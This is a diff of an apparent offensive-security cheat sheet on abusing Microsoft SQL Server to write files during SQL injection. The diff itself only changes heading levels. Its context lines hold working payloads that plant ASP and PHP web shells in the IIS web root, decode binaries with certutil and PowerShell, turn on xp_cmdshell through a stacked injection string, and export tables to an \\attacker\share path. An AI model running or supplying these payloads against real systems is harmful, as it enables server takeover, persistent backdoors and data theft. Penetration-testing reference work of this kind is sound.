@@ -7,11 +7,9 @@ tags: ["file operations", "bcp", "xp_cmdshell", "web shell"]
 lastUpdated: 2025-12-15
 ---
 
-## Writing Files
-
 Microsoft SQL Server provides several methods to write files to the server's filesystem, which can be exploited during SQL injection attacks to deploy web shells, exfiltrate data, or establish persistence.
 
-### Prerequisites
+## Prerequisites
 
 To write files from MSSQL, you typically need one of the following:
 
@@ -19,11 +17,11 @@ To write files from MSSQL, you typically need one of the following:
 2. `Ole Automation Procedures` enabled (for sp_OACreate)
 3. Write permissions to target directory for the SQL Server service account
 
-### Using xp_cmdshell
+## Using xp_cmdshell
 
 The most straightforward method when enabled:
 
-#### Writing Text Files
+### Writing Text Files
 
 ```sql
 -- Simple file write using echo
@@ -36,7 +34,7 @@ EXEC xp_cmdshell 'echo line1 > C:\temp\file.txt && echo line2 >> C:\temp\file.tx
 EXEC xp_cmdshell 'powershell -c "Set-Content -Path C:\temp\file.txt -Value ''content here''"';
 ```
 
-#### Writing Web Shells
+### Writing Web Shells
 
 **Note:** The caret (`^`) escapes below are for cmd.exe. For PowerShell, use the backtick (`` ` ``) or encode content as base64.
 
@@ -54,7 +52,7 @@ EXEC xp_cmdshell 'echo ^<%Response.Write(CreateObject("WScript.Shell").exec(Requ
 EXEC xp_cmdshell 'powershell -c "[IO.File]::WriteAllBytes(''C:\inetpub\wwwroot\shell.aspx'', [Convert]::FromBase64String(''BASE64_ENCODED_SHELL''))"';
 ```
 
-#### Writing Binary Files
+### Writing Binary Files
 
 ```sql
 -- Using certutil to decode base64
@@ -64,7 +62,7 @@ EXEC xp_cmdshell 'echo BASE64_DATA > C:\temp\encoded.txt && certutil -decode C:\
 EXEC xp_cmdshell 'powershell -c "[IO.File]::WriteAllBytes(''C:\temp\binary.exe'', [Convert]::FromBase64String(''BASE64_DATA''))"';
 ```
 
-### Using BCP (Bulk Copy Program)
+## Using BCP (Bulk Copy Program)
 
 Export query results to files:
 
@@ -79,7 +77,7 @@ EXEC xp_cmdshell 'bcp "SELECT * FROM targetdb.dbo.users" queryout "C:\temp\users
 EXEC xp_cmdshell 'bcp "SELECT ''<?php system($_GET[cmd]); ?>''" queryout "C:\inetpub\wwwroot\s.php" -c -T';
 ```
 
-#### BCP Options
+### BCP Options
 
 | Option | Description                       |
 | ------ | --------------------------------- |
@@ -90,7 +88,7 @@ EXEC xp_cmdshell 'bcp "SELECT ''<?php system($_GET[cmd]); ?>''" queryout "C:\ine
 | `-U`   | Username (SQL auth)               |
 | `-P`   | Password (SQL auth)               |
 
-### OLE Automation (sp_OACreate)
+## OLE Automation (sp_OACreate)
 
 Use FileSystemObject for file operations:
 
@@ -112,7 +110,7 @@ EXEC sp_OADestroy @file;
 EXEC sp_OADestroy @fso;
 ```
 
-#### Writing Binary with ADODB.Stream
+### Writing Binary with ADODB.Stream
 
 ```sql
 DECLARE @stream INT;
@@ -126,7 +124,7 @@ EXEC sp_OAMethod @stream, 'Close';
 EXEC sp_OADestroy @stream;
 ```
 
-### Using SQL Agent Jobs
+## Using SQL Agent Jobs
 
 Write files via CmdExec job steps:
 
@@ -148,7 +146,7 @@ EXEC msdb.dbo.sp_start_job @job_name = 'WriteFile';
 EXEC msdb.dbo.sp_delete_job @job_name = 'WriteFile';
 ```
 
-### Common Writable Directories
+## Common Writable Directories
 
 | Directory                     | Description         |
 | ----------------------------- | ------------------- |
@@ -159,7 +157,7 @@ EXEC msdb.dbo.sp_delete_job @job_name = 'WriteFile';
 | `C:\ProgramData\`             | Application data    |
 | `%TEMP%` (via xp_cmdshell)    | User temp directory |
 
-### SQL Injection Examples
+## SQL Injection Examples
 
 ```sql
 -- Stacked query to write web shell
@@ -172,7 +170,7 @@ EXEC msdb.dbo.sp_delete_job @job_name = 'WriteFile';
 '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'echo pwned > C:\temp\test.txt'--
 ```
 
-### Checking Permissions
+## Checking Permissions
 
 ```sql
 -- Check if sysadmin
@@ -188,9 +186,9 @@ SELECT value_in_use FROM sys.configurations WHERE name = 'Ole Automation Procedu
 EXEC xp_cmdshell 'whoami';
 ```
 
-### Bypassing Restrictions
+## Bypassing Restrictions
 
-#### When xp_cmdshell is Disabled
+### When xp_cmdshell is Disabled
 
 ```sql
 -- Try enabling it (requires sysadmin)
@@ -209,7 +207,7 @@ RECONFIGURE;
 -- ... (see OLE Automation section above)
 ```
 
-#### When Direct Paths are Blocked
+### When Direct Paths are Blocked
 
 ```sql
 -- Use environment variables
@@ -221,7 +219,7 @@ EXEC xp_cmdshell 'echo test > \\attacker\share\test.txt';
 
 **Note:** UNC paths require the SQL Server host to have network connectivity to the target SMB share, appropriate firewall rules (outbound port 445), and valid credentials or anonymous access. This will fail in network-isolated environments.
 
-### Data Exfiltration via Files
+## Data Exfiltration via Files
 
 ```sql
 -- Export sensitive data
@@ -234,7 +232,7 @@ EXEC xp_cmdshell 'bcp "SELECT * FROM secrets" queryout "\\attacker\share\data.tx
 EXEC xp_cmdshell 'powershell -c "Compress-Archive -Path C:\temp\data.txt -DestinationPath C:\temp\data.zip"';
 ```
 
-### Important Constraints
+## Important Constraints
 
 | Constraint            | Description                                       |
 | --------------------- | ------------------------------------------------- |
@@ -244,7 +242,7 @@ EXEC xp_cmdshell 'powershell -c "Compress-Archive -Path C:\temp\data.txt -Destin
 | File Locks            | Cannot overwrite files in use                     |
 | Path Length           | Windows MAX_PATH limit (260 chars) may apply      |
 
-### Mitigation
+## Mitigation
 
 To prevent unauthorized file writing:
 
